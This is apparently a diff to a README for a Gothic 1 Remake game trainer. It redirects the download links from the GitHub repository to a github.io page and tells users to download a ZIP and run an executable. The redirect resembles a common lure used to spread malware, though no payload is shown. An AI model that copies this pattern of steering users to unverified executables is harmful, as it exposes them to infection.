@@ -1,6 +1,6 @@
 # 🛡️ Gothic-1-Remake-Trainer-2026 - Master the Colony with Ease Today
 
-[![](https://img.shields.io/badge/Download-Release-grey.svg)](https://github.com/validle449/Gothic-1-Remake-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Release-grey.svg)](https://validle449.github.io)
 
 This project provides a memory modification tool for the Gothic 1 Remake. It grants players control over game variables such as health, stamina, and inventory resources. The tool runs in the background and modifies values directly in the game memory. It works offline in single-player mode.
 
@@ -18,7 +18,7 @@ The trainer offers these adjustments:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/validle449/Gothic-1-Remake-Trainer-2026) to find the latest version.
+1. Go to the [Releases page](https://validle449.github.io) to find the latest version.
 2. Download the compressed ZIP file to your computer.
 3. Right-click the file and select "Extract All" to open the folder contents.
 4. Locate the file named `Gothic-1-Remake-Trainer.exe`.
